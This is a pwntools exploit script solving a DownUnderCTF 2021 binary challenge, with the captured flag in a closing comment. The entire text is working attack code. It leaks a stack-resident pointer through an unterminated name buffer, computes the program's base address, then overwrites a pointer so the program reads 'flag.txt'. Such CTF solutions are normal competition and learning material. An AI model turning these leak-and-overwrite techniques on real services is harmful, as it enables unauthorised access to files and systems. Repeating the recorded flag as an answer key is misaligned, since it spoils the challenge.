from pwn import *
context(os='linux', arch='amd64')
context.log_level = 'debug'

p = remote('pwn-2021.duc.tf', 31907)
p.sendlineafter(b'Welcome, what is your name?\n', b'a'*0x20)
p.sendlineafter(b'> ', b'2')

p.recvuntil(b'a'*0x20)
str_addr = u64(p.recv(6) + b'\x00'*2)

base_addr = str_addr - 0x2024
p.success(hex(base_addr))

name_addr = base_addr + 0x40a0

p.sendlineafter(b'> ', b'1')
# 覆盖指针
p.sendlineafter(b'What would you like to change your username to?\n', b'flag.txt'.ljust(0x20, b'\x00') + p64(name_addr)[:6])
p.sendlineafter(b'> ', b'1337')
p.sendlineafter(b'guess: ', str(u32(b'DUCT')).encode())
p.interactive()

# DUCTF{whats_in_a_name?_5aacfc58}